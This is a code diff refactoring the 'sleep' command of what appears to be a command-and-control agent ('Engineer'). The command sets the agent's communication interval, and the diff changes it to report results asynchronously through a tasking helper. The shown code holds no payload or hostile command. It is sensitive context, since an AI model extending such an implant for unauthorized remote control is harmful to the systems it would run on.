@@ -1,4 +1,5 @@
-﻿using Engineer.Models;
+﻿using Engineer.Functions;
+using Engineer.Models;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -11,17 +12,17 @@ namespace Engineer.Commands
     {
         public override string Name => "sleep";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             if (task.Arguments != null)
             {
                 task.Arguments.TryGetValue("/time", out var sleep);
 
-                EngCommBase.Sleep = int.Parse(sleep)*1000;
-                return "Sleep set to " + EngCommBase.Sleep/1000;
+                EngCommBase.Sleep = int.Parse(sleep) * 1000;
+                Tasking.FillTaskResults("Sleep set to " + EngCommBase.Sleep / 1000, task, EngTaskStatus.Complete);
             }
             else
-                return "error: " + "Sleep setting change failed, please provide a number in seconds like so Sleep 5";
+                Tasking.FillTaskResults("error: " + "Sleep setting change failed, please provide a number in seconds like so Sleep 5", task, EngTaskStatus.FailedWithWarnings);
             
         }
     }
